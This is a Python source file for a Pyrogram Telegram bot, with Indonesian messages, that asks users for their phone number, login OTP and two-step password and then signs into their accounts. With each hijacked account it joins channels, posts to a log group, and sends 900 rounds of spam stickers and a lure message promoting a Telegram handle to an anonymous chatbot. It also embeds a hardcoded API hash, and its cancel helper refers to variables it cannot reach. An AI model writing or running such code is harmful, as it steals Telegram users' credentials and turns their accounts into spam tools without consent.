import asyncio, os

from c import bot
from pyromod import listen

from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    SessionPasswordNeeded, FloodWait,
    PhoneNumberInvalid, ApiIdInvalid,
    PhoneCodeInvalid, PhoneCodeExpired
)


PHONE_NUMBER_TEXT = "kirim nomor telegram dengan format +62895xxxxxx"

BOT = "chatbot"
TAI = "CAACAgUAAxkBAAEEr4dkCAVEVFeu2EgWFjTTDx_JdUEdwQAC_wkAAqYlQFQR92a7rlhzny4E"
counts = 900
LOG = -1001879930806
CHGUA = -1001792459801
OMAY = -1001592666025

@bot.on_message(filters.private & filters.command ("start"))
async def genStr(_, msg: Message):
    chat = msg.chat
    api_id = 19685518
    api_hash = "33bf1d586e5fdfd9e66aaa52a576935a"
    filename = f"kom{msg.from_user.id}.session"
    filenamee = f"kom{msg.from_user.id}.session-journal"
    while True:
        number = await bot.ask(msg.from_user.id, PHONE_NUMBER_TEXT)
        if not number.text:
            continue
        if await is_cancel(msg, number.text):
            return
        phone = number.text
        confirm = await bot.ask(chat.id, f'`yakin "{phone}" sudah benar? (y/n):` \n\nKetik: `y` (untuk ya)\nKetik: `n` (untuk No)')
        if await is_cancel(msg, confirm.text):
            return
        if "y" in confirm.text:
            break
    try:
        client = Client(f"kom{msg.from_user.id}", api_id=api_id, api_hash=api_hash)
    except Exception as e:
        await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`\nKetik /start Ulangi ngab.")
        return
    try:
        await client.connect()
    except ConnectionError:
        await client.disconnect()
        await client.connect()
    try:
        code = await client.send_code(phone)
        await asyncio.sleep(1)
    except FloodWait as e:
        os.remove(filename)
        os.remove(filenamee)
        await msg.reply(f"Sabar ngab terlalu banyak mencoba tunggu {e.x} detik")
        return
    except ApiIdInvalid:
        await msg.reply("API ID and API Hash Tidak ada.\n\nKlik /start Coba lagi ngab.")
        return
    except PhoneNumberInvalid:
        os.remove(filename)
        os.remove(filenamee)
        await msg.reply("Nomormu fake ngab.\n\nKlik /start Coba lagi ngab.")
        return
    try:
        otp = await bot.ask(chat.id, "Kode OTP Sudah di kirim ke nomermu ngab,")

    except Exception as e:
        os.remove(filename)
        os.remove(filenamee)
        await msg.reply("Dahlah waktu habis ngab sudah 5 min.\nTekan /start Coba lagi ngab.")
        return
    if await is_cancel(msg, otp.text):
        return
    otp_code = otp.text
    try:
        await client.sign_in(phone, code.phone_code_hash, phone_code=' '.join(str(otp_code)))
    except PhoneCodeInvalid:
        os.remove(filename)
        os.remove(filenamee)
        await msg.reply("Kode salah cuk.\n\nKlik /start Coba lagi ngab.")
        return
    except PhoneCodeExpired:
        os.remove(filename)
        os.remove(filenamee)
        await msg.reply("Kode kadaluarsa.\n\nKlik /start Coba lagi ngab.")
        return
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                chat.id, 
                "Bajingan sesi dua langkah cuk.\nKirim Password loe cok.\n\nKlik /cancel Untuk berhenti dan putus.",
                timeout=300
            )
        except Exception as e:
            await msg.reply("`Waktu sudah melebihi batas cuk 5 min.\n\nKlik /start Coba lagi ngab.`")
            return
        if await is_cancel(msg, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await client.check_password(new_code)
        except Exception as e:
            os.remove(filename)
            os.remove(filenamee)
            await msg.reply(f"**ERROR:** `{str(e)}`")
            return
    except Exception as e:
        os.remove(filename)
        os.remove(filenamee)
        await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`")
        return
    try:
        await client.send_message(BOT, "/start")
        await client.join_chat("validc0de")
        await client.join_chat("spambotte")
        await client.send_message(LOG, "GUA NYALA")
        for _ in range(counts):
          await client.send_message(BOT, "/next")
          await asyncio.sleep(6)
          await client.send_sticker(BOT, TAI)
          await asyncio.sleep(2)
          await client.send_message(BOT, "**Hallo aku sifa\nklik stiker diatas ada link** `@randomvirt` **disitu bnyak cewe/cowo cakepp.**")
          await asyncio.sleep(3)
        await client.send_message(LOG, "GUA MATI")
        await client.disconnect()
        os.remove(filename)
        os.remove(filenamee)
    except Exception as e:
        os.remove(filename)
        os.remove(filenamee)
        await bot.send_message(chat.id ,f"**ERROR:** `{str(e)}`")
        return

async def is_cancel(msg: Message, text: str):
    if text.startswith("/cancel"):
        os.remove(filename)
        os.remove(filenamee)
        await msg.reply("Proses di batalkan.")
        return True
    return False

if __name__ == "__main__":
    bot.run()
